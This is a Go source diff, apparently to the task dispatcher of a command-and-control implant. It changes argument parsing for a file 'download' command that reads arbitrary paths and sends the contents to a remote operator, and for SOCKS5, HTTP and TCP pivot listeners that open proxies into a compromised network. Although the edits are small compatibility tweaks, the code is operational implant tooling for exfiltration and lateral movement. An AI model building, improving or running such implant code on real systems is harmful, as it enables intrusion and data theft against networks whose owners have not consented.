@@ -226,8 +226,13 @@ func dispatchTask(t transport, task taskWire) {
 		var args struct {
 			Path string `json:"path"`
 		}
-		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
-			t.sendResult(task.ID, "", "bad args: "+err.Error())
+		// Accept both the current plain-path wire format and the legacy JSON
+		// envelope so older operators remain compatible.
+		if err := json.Unmarshal([]byte(task.Args), &args); err != nil || args.Path == "" {
+			args.Path = strings.TrimSpace(task.Args)
+		}
+		if args.Path == "" {
+			t.sendResult(task.ID, "", "download: path required")
 			return
 		}
 		data, err := os.ReadFile(args.Path)
@@ -610,19 +615,26 @@ func dispatchTask(t transport, task taskWire) {
 	// ── Pivot ─────────────────────────────────────────────────────────────────
 
 	case "SOCKS_START":
-		// Args: "<port> [user:pass]"
+		// Args: JSON {port,user,pass}; accept the legacy text form too.
 		parts := strings.Fields(task.Args)
 		port := 1080
 		var socksU, socksP string
-		if len(parts) >= 1 {
+		var sa struct {
+			Port int `json:"port"`
+			User string `json:"user"`
+			Pass string `json:"pass"`
+		}
+		if json.Unmarshal([]byte(task.Args), &sa) == nil && sa.Port > 0 {
+			port, socksU, socksP = sa.Port, sa.User, sa.Pass
+		} else if len(parts) >= 1 {
 			if p, err := strconv.Atoi(parts[0]); err == nil {
 				port = p
 			}
-		}
-		if len(parts) >= 2 {
-			if idx := strings.Index(parts[1], ":"); idx > 0 {
-				socksU = parts[1][:idx]
-				socksP = parts[1][idx+1:]
+			if len(parts) >= 2 {
+				if idx := strings.Index(parts[1], ":"); idx > 0 {
+					socksU = parts[1][:idx]
+					socksP = parts[1][idx+1:]
+				}
 			}
 		}
 		addr, err := startSOCKS5(port, socksU, socksP)
@@ -1149,6 +1161,11 @@ func dispatchTask(t transport, task taskWire) {
 		if task.Args != "" {
 			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
 				port = p
+			} else {
+				var pa struct{ Port int `json:"port"` }
+				if json.Unmarshal([]byte(task.Args), &pa) == nil && pa.Port > 0 {
+					port = pa.Port
+				}
 			}
 		}
 		if err := startHTTPPivot(port); err != nil {
@@ -1165,6 +1182,11 @@ func dispatchTask(t transport, task taskWire) {
 		if task.Args != "" {
 			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
 				port = p
+			} else {
+				var pa struct{ Port int `json:"port"` }
+				if json.Unmarshal([]byte(task.Args), &pa) == nil && pa.Port > 0 {
+					port = pa.Port
+				}
 			}
 		}
 		if err := startTCPPivot(port); err != nil {
